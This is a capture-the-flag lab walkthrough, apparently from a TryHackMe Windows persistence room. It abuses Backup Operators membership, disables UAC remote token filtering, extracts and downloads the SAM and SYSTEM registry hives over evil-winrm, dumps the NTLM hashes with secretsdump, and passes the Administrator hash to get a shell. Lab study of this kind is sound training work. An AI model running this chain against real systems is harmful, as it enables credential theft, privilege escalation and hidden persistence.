# Assigning Group Memberships
1. Start this room's machine
2. `cd \` from the compromised Windows machine to ensure that we'll be executing the following commands starting from the root directory
```PowerShell
C:\Users\Administrator>cd \
```
3. `net localgroup “Backup Operators” thmuser1 /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Backup Operators** group, which won't give our target user administrative privileges but it will allow them to read and write to files within its system regardless of the system's DACL configurations and any other set permissions that may prevent users from accessing those files
```PowerShell
C:\>net localgroup "Backup Operators" thmuser1 /add
The command completed successfully.
```
4. `net localgroup “Remote Management Users” thmuser1 /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Remote Management Users** group in order to have our target user be able to connect back to the compromised machine using WinRM
```PowerShell
C:\>net localgroup "Remote Management Users" thmuser1 /add
The command completed successfully.
```
5. `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v /EnableLUA` from the compromised Windows machine to check if Microsoft's UAC is active on our compromised machine and display the results onto our terminal, which ended up being the case (1 meaning that it's enabled) and therefore preventing us from running any administrative privileges when remotely connecting back to the compromised machine since it strips the user who's remotely connecting to the compromised system from any administrative privileges that they may have by disabling their access to the privileges of the groups that they're a part of that have full or certain administrator privileges, which in this case was the **Backup Operators** group
```PowerShell
C:\>reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
6. `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` from the compromised Windows machine to enable the compromised system's LocalAccountTokenFilterPolicy registry policy, which allowed us to disable UAC's remote restrictions and have the **Backup Operators** group's privileges enabled for our compromised user when connecting remotely to the compromised system
```PowerShell
C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```
7. `evil-winrm -i {TARGET IP} -u thmuser1 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
```Bash
root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u thmuser1 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser1\Documents> 
```
8. `whoami /groups`
```bash
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
9. `cd \`
```Bash
*Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
```
10. `reg save hklm\system {FILENAME1}.bak`
```Bash
*Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
The operation completed successfully.

```
11. `reg save hklm\sam {FILENAME2}.bak`
```Bash
*Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
The operation completed successfully.

```
12. `download {FILENAME1}.bak`
```Bash
*Evil-WinRM* PS C:\> download SYSTEM.bak
Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak

                                                             
Info: Download successful!
```
13. `download {FILENAME2}.bak` 
```Bash
*Evil-WinRM* PS C:\> download SAM.bak
Info: Downloading C:\\SAM.bak to SAM.bak

                                                             
Info: Download successful!
```
14. `exit`
```Bash
*Evil-WinRM* PS C:\> exit

Info: Exiting with code 0

root@ip-10-10-72-227:~# 
```
15. `ls`
```Bash
root@ip-10-10-72-227:~# ls
Desktop    Instructions  Postman  SAM.bak  SYSTEM.bak         Tools
Downloads  Pictures      Rooms    Scripts  thinclient_drives  work
```
16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL`
```Bash
root@ip-10-10-72-227:~# python3.9 /opt/impacket/examples/secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL 
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
[*] Cleaning up... 
```
17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}`
```Bash
root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
18. `C:\flags\flag1.exe`
```Bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
THM{FLAG_BACKED_UP!}
```

# Assigning Specific Privileges Using Security Descriptors

# RID Hijacking
